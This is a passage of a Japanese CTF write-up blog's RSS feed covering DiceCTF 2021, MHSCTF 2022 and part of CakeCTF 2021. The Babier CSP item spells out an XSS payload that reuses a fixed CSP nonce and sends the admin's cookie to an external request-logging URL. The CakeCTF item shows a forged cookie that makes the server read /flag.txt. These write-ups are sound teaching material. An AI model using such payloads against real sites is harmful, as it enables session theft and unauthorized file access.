      <guid>/dicectf2021/babiercsp/</guid>
      <description>web/Babier CSP 問題 babier-csp.dicec.tf
Admin Bot
The admin will set a cookie secret equal to config.secret in index.js.
解説 まず babier-csp.dicec.tf は name に渡された文字列をそのまま表示させています。そのため XSS が期待できますが、 &amp;lt;script&amp;gt;alert(&#39;ok&#39;)&amp;lt;/script&amp;gt; などを直接入れても以下のように怒られます。
Refused to execute inline script because it violates the following Content Security Policy directive: &amp;#34;script-src &amp;#39;nonce-LRGWAXOY98Es0zz0QOVmag==&amp;#39;&amp;#34;. Either the &amp;#39;unsafe-inline&amp;#39; keyword, a hash (&amp;#39;sha256-GhSELej6D4No8Cu4c6BlA7SQooAXc4iM9HQ5s9uW7Gw=&amp;#39;), or a nonce (&amp;#39;nonce-...&amp;#39;) is required to enable inline execution. script タグの nonce 属性には、CSP(Content Security Policy) によって JavaScript の実行を制限し、XSS などを防ぐ機能があります。しかし nonce の値が予測できてしまえば意味をなさないため、本来はリクエストごとにランダムな文字列を生成しなければならないのですが、このページでは LRGWAXOY98Es0zz0QOVmag== で固定されています。そのため &amp;lt;script nonce=LRGWAXOY98Es0zz0QOVmag==&amp;gt;hoge&amp;lt;/script&amp;gt; という形式で怒られずに任意のスクリプトをインジェクションできます。</description>
      <content>&lt;h1 id=&#34;webbabier-csp&#34;&gt;web/Babier CSP&lt;/h1&gt;
&lt;h2 id=&#34;問題&#34;&gt;問題&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;babier-csp.dicec.tf&#34;&gt;babier-csp.dicec.tf&lt;/a&gt;&lt;br&gt;
&lt;a href=&#34;https://us-east1-dicegang.cloudfunctions.net/ctf-2021-admin-bot?challenge=babier-csp&#34;&gt;Admin Bot&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;The admin will set a cookie &lt;code&gt;secret&lt;/code&gt; equal to &lt;code&gt;config.secret&lt;/code&gt; in &lt;a href=&#34;https://github.com/raster0x2a/CTF-writeup/blob/master/DiceCTF2021/index.js&#34;&gt;index.js&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&#34;解説&#34;&gt;解説&lt;/h2&gt;
&lt;p&gt;まず &lt;a href=&#34;babier-csp.dicec.tf&#34;&gt;babier-csp.dicec.tf&lt;/a&gt; は name に渡された文字列をそのまま表示させています。そのため XSS が期待できますが、 &lt;code&gt;&amp;lt;script&amp;gt;alert(&#39;ok&#39;)&amp;lt;/script&amp;gt;&lt;/code&gt; などを直接入れても以下のように怒られます。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Refused to execute inline script because it violates the following Content Security Policy directive: &amp;#34;script-src &amp;#39;nonce-LRGWAXOY98Es0zz0QOVmag==&amp;#39;&amp;#34;. Either the &amp;#39;unsafe-inline&amp;#39; keyword, a hash (&amp;#39;sha256-GhSELej6D4No8Cu4c6BlA7SQooAXc4iM9HQ5s9uW7Gw=&amp;#39;), or a nonce (&amp;#39;nonce-...&amp;#39;) is required to enable inline execution.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;script タグの nonce 属性には、CSP(Content Security Policy) によって JavaScript の実行を制限し、XSS などを防ぐ機能があります。しかし nonce の値が予測できてしまえば意味をなさないため、本来はリクエストごとにランダムな文字列を生成しなければならないのですが、このページでは &lt;code&gt;LRGWAXOY98Es0zz0QOVmag==&lt;/code&gt; で固定されています。そのため &lt;code&gt;&amp;lt;script nonce=LRGWAXOY98Es0zz0QOVmag==&amp;gt;hoge&amp;lt;/script&amp;gt;&lt;/code&gt; という形式で怒られずに任意のスクリプトをインジェクションできます。&lt;/p&gt;
&lt;p&gt;次に &lt;a href=&#34;https://us-east1-dicegang.cloudfunctions.net/ctf-2021-admin-bot?challenge=babier-csp&#34;&gt;Admin Bot&lt;/a&gt; では、 URL を入力して submit すると入力した URL に Admin がアクセスしてくれます。Admin の cookie を得ることが第一の目的なので、 &lt;a href=&#34;babier-csp.dicec.tf&#34;&gt;babier-csp.dicec.tf&lt;/a&gt; にアクセスさせてから、cookie をクエリに含めてリクエスト内容を確認できる URL に遷移させることを考えます。
私はリクエストを確認するために &lt;a href=&#34;https://requestinspector.com/&#34;&gt;Request Inspector&lt;/a&gt; というサイトを利用しました。
具体的には以下の URL を入力することで cookie が確認できました。&lt;br&gt;
&lt;code&gt;https://babier-csp.dicec.tf/?name=&amp;lt;script nonce=LRGWAXOY98Es0zz0QOVmag==&amp;gt;location.href=`[Request Inspectorで発行したURL]?${document.cookie}`&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;index.js&lt;/code&gt;を見てみると&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;app&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;use&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;SECRET&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;express&lt;/span&gt;.&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;__dirname&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/secret&amp;#34;&lt;/span&gt;));
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;とあるため、 &lt;code&gt;https://babier-csp.dicec.tf/[cookieのsecretの値]&lt;/code&gt; にアクセスしてみると、ソースのコメントにフラグが書いてあります。&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title></title>
      <link>/mhsctf2022/mhsctf2022/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/mhsctf2022/mhsctf2022/</guid>
      <description>MHSCTF 2022 簡易Writeup 目次  Peanuts Perspective Where the Wild Cards Are 2 Cloudy w/ a Chance of Rain Reconstruction Blank Slate 2 Blank Slate 3 Blank Slate 4 Piece It Together Avengers Assemble Blatant Corruption 1 chal 2 categories  Peanuts ググるとPigpen Cipher Fontというものが見つかる。ファベットとの対応が3パターンほど見つかるという罠がある。私は3つ目で正解でした。
Perspective stlファイルを開けるアプリで開いて真上から確認する。上から見てもわかりずらい。
Where the Wild Cards Are 2 [a-z](?=[A-Z]{2,}\d{3,})
\w
1つ目は肯定先読みを使う。2つ目は\wというメタ文字があるのでそれが最短。
Cloudy w/ a Chance of Rain n = int(input()) for _ in range(n):  lst = list(map(int, input().</description>
      <content>&lt;h1 id=&#34;mhsctf-2022-簡易writeup&#34;&gt;MHSCTF 2022 簡易Writeup&lt;/h1&gt;
&lt;h2 id=&#34;目次&#34;&gt;目次&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#peanuts&#34;&gt;Peanuts&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#perspective&#34;&gt;Perspective&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#where-the-wild-cards-are-2&#34;&gt;Where the Wild Cards Are 2&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#cloudy-w-a-chance-of-rain&#34;&gt;Cloudy w/ a Chance of Rain&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#reconstruction&#34;&gt;Reconstruction&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#blank-slate-2&#34;&gt;Blank Slate 2&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#blank-slate-3&#34;&gt;Blank Slate 3&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#blank-slate-4&#34;&gt;Blank Slate 4&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#piece-it-together&#34;&gt;Piece It Together&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#avengers-assemble&#34;&gt;Avengers Assemble&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#blatant-corruption&#34;&gt;Blatant Corruption&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#1-chal-2-categories&#34;&gt;1 chal 2 categories&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;peanuts&#34;&gt;Peanuts&lt;/h2&gt;
&lt;p&gt;ググると&lt;a href=&#34;https://fontmeme.com/jfont/pigpen-cipher-font/&#34;&gt;Pigpen Cipher Font&lt;/a&gt;というものが見つかる。ファベットとの対応が3パターンほど見つかるという罠がある。私は3つ目で正解でした。&lt;/p&gt;
&lt;h2 id=&#34;perspective&#34;&gt;Perspective&lt;/h2&gt;
&lt;p&gt;stlファイルを開けるアプリで開いて真上から確認する。上から見てもわかりずらい。&lt;/p&gt;
&lt;h2 id=&#34;where-the-wild-cards-are-2&#34;&gt;Where the Wild Cards Are 2&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;[a-z](?=[A-Z]{2,}\d{3,})&lt;/code&gt;&lt;br&gt;
&lt;code&gt;\w&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;1つ目は肯定先読みを使う。2つ目は\wというメタ文字があるのでそれが最短。&lt;/p&gt;
&lt;h2 id=&#34;cloudy-w-a-chance-of-rain&#34;&gt;Cloudy w/ a Chance of Rain&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;n &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; int(input())
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; _ &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(n):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  lst &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; list(map(int, input()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split()))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ans &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; lst:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    ans &lt;span style=&#34;color:#f92672&#34;&gt;*=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; n
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ans &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; ans &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt; (len(lst) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  print(int(ans))
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;試していないのでわからないがループ毎で除算を行ってしまうと誤差で通らないようになってそう。&lt;/p&gt;
&lt;h2 id=&#34;reconstruction&#34;&gt;Reconstruction&lt;/h2&gt;
&lt;p&gt;行が&amp;quot;;&amp;ldquo;区切り、列が&amp;rdquo;,&amp;ldquo;区切りになっているので、分割して3つずつRGBに変換。&lt;/p&gt;
&lt;h2 id=&#34;blank-slate-2&#34;&gt;Blank Slate 2&lt;/h2&gt;
&lt;p&gt;ファイルデータは.gitの中のobjectsに入っているので、Pythonでobjects以下のファイルをzlib形式で解凍するスクリプトを書く。&lt;/p&gt;
&lt;h2 id=&#34;blank-slate-3&#34;&gt;Blank Slate 3&lt;/h2&gt;
&lt;p&gt;RGBが(0,0,0)と(0,1,0)の部分があるので、(0,1,0)部分を(0,255,0)にした画像を作成。&lt;/p&gt;
&lt;h2 id=&#34;blank-slate-4&#34;&gt;Blank Slate 4&lt;/h2&gt;
&lt;p&gt;先頭にBOMがあり、以降にゼロ幅スペースと半角スペースが並んでいるので、それぞれ0と1に置き換えて二進数から文字コードで変換。&lt;/p&gt;
&lt;h2 id=&#34;piece-it-together&#34;&gt;Piece It Together&lt;/h2&gt;
&lt;p&gt;二重のHTMLエスケープで難読化されているので変換する。最後のscriptタグの中にcheckpwd()という関数があって怪しいので、関数の中の条件式で使われている文字列を出力するとフラグ。&lt;/p&gt;
&lt;h2 id=&#34;avengers-assemble&#34;&gt;Avengers Assemble&lt;/h2&gt;
&lt;p&gt;Pythonのdisモジュールで生成されたバイトコード。ドキュメント見ながら気合で読むと整数列にインデックスのmod 7を足してずらしていることがわかる。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;lst &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; list(map(int, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;102 109 99 106 127 53 116 95 122 113 120 118 100 55 51 103 57 128&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split()))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(len(lst)):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      lst[i] &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;join([chr(n) &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; lst])) 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;blatant-corruption&#34;&gt;Blatant Corruption&lt;/h2&gt;
&lt;p&gt;バイナリを見ると0d0a1a0aから始まっており、これはPNGのマジックナンバーの5～8バイト目。1～4バイト目の89504e47を先頭に書き足すとPNGファイルとして読めるようになる。&lt;/p&gt;
&lt;h2 id=&#34;1-chal-2-categories&#34;&gt;1 chal 2 categories&lt;/h2&gt;
&lt;p&gt;まずPythonファイルを読み、画像を逆変換すると、右下に重なっていて読めない文字列が見える。ピクセルのインデックスのmod 4で分解するとフラグの先頭1/3と後ろ2/3に分離できた。後半の重なりは意味の通る文になるように気合で分離するとフラグが得られる。&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>CakeCTF 2021 Writeup</title>
      <link>/cakectf2021/cakectf2021/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/cakectf2021/cakectf2021/</guid>
      <description>CakeCTF 2021 Writeup 注意: 書きかけです
目次  Pwn  No Step On Snek Jellyspotters MDL Considered Harmful    MofuMofu Diary - 110 問題 Would you like to see some mofu-mofu pictures?
* The flag is located at /flag.txt
mofumofu_diary_82c31e779086e3079e0ac62643e14fed.tar.gz(を解凍したもの)
author: ptr-yudai
解説 index.phpとutil.phpを読むと、だいたいの動きとしてCookieのcache中にdataとexpiryがあり、dataの中には画像ファイル名であるname、画像の説明であるdescriptionがあり、expiryの日付が一週間以上前の場合は再度Cookie情報からファイルの再読み込みをして表示しています。
重要な部分はCookie情報からファイルの再読み込みをしていることで、Cookieを編集することで自由なファイルを読み込ませることができる点です。
再読み込みさせるためにexpiryを適当に1週間以上前の値にし、nameが/flag.txtになるデータを作ります。例えばChromeの開発者モードのApplicationタブで以下のようなものをパーセントエンコーディングしてcacheに入れます。
{&amp;quot;data&amp;quot;:[{&amp;quot;name&amp;quot;:&amp;quot;\/flag.txt&amp;quot;,&amp;quot;description&amp;quot;:&amp;quot;flag&amp;quot;}],&amp;quot;expiry&amp;quot;:1530722670}
リロードするとbase64エンコードされたフラグが手に入るのでデコードして終了。
UAF4b - 113 問題 warmuppwn You don&amp;rsquo;t dare to try learning Use-after-Free?
nc pwn.cakectf.com 9001
author: ptr-yudai
解説 </description>
      <content>&lt;h1 id=&#34;cakectf-2021-writeup&#34;&gt;CakeCTF 2021 Writeup&lt;/h1&gt;
&lt;p&gt;注意: 書きかけです&lt;/p&gt;
&lt;h2 id=&#34;目次&#34;&gt;目次&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Pwn
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#no-step-on-snek&#34;&gt;No Step On Snek&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#jellyspotters&#34;&gt;Jellyspotters&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#mdl-considered-harmful&#34;&gt;MDL Considered Harmful&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;mofumofu-diary---110&#34;&gt;MofuMofu Diary - 110&lt;/h2&gt;
&lt;h3 id=&#34;問題&#34;&gt;問題&lt;/h3&gt;
&lt;p&gt;&lt;a href=&#34;http://web.cakectf.com:8003/&#34;&gt;Would you like to see some mofu-mofu pictures?&lt;/a&gt;&lt;br&gt;
* The flag is located at &lt;code&gt;/flag.txt&lt;/code&gt;&lt;br&gt;
&lt;a href=&#34;https://github.com/raster0x2a/CTF-writeup/blob/master/CakeCTF2021/mofumofu_diary_82c31e779086e3079e0ac62643e14fed&#34;&gt;mofumofu_diary_82c31e779086e3079e0ac62643e14fed.tar.gz(を解凍したもの)&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;author: ptr-yudai&lt;/p&gt;
&lt;h3 id=&#34;解説&#34;&gt;解説&lt;/h3&gt;
&lt;p&gt;index.phpとutil.phpを読むと、だいたいの動きとしてCookieの&lt;code&gt;cache&lt;/code&gt;中に&lt;code&gt;data&lt;/code&gt;と&lt;code&gt;expiry&lt;/code&gt;があり、&lt;code&gt;data&lt;/code&gt;の中には画像ファイル名である&lt;code&gt;name&lt;/code&gt;、画像の説明である&lt;code&gt;description&lt;/code&gt;があり、&lt;code&gt;expiry&lt;/code&gt;の日付が一週間以上前の場合は再度Cookie情報からファイルの再読み込みをして表示しています。&lt;br&gt;
重要な部分はCookie情報からファイルの再読み込みをしていることで、Cookieを編集することで自由なファイルを読み込ませることができる点です。&lt;br&gt;
再読み込みさせるために&lt;code&gt;expiry&lt;/code&gt;を適当に1週間以上前の値にし、&lt;code&gt;name&lt;/code&gt;が&lt;code&gt;/flag.txt&lt;/code&gt;になるデータを作ります。例えばChromeの開発者モードのApplicationタブで以下のようなものをパーセントエンコーディングして&lt;code&gt;cache&lt;/code&gt;に入れます。&lt;br&gt;
&lt;code&gt;{&amp;quot;data&amp;quot;:[{&amp;quot;name&amp;quot;:&amp;quot;\/flag.txt&amp;quot;,&amp;quot;description&amp;quot;:&amp;quot;flag&amp;quot;}],&amp;quot;expiry&amp;quot;:1530722670}&lt;/code&gt;&lt;br&gt;
リロードするとbase64エンコードされたフラグが手に入るのでデコードして終了。&lt;/p&gt;
&lt;h2 id=&#34;uaf4b---113&#34;&gt;UAF4b - 113&lt;/h2&gt;
&lt;h3 id=&#34;問題-1&#34;&gt;問題&lt;/h3&gt;
&lt;p&gt;warmuppwn
You don&amp;rsquo;t dare to try learning Use-after-Free?&lt;br&gt;
&lt;code&gt;nc pwn.cakectf.com 9001&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;author: ptr-yudai&lt;/p&gt;
&lt;h3 id=&#34;解説-1&#34;&gt;解説&lt;/h3&gt;
</content>
    </item>
    
  </channel>
</rss>
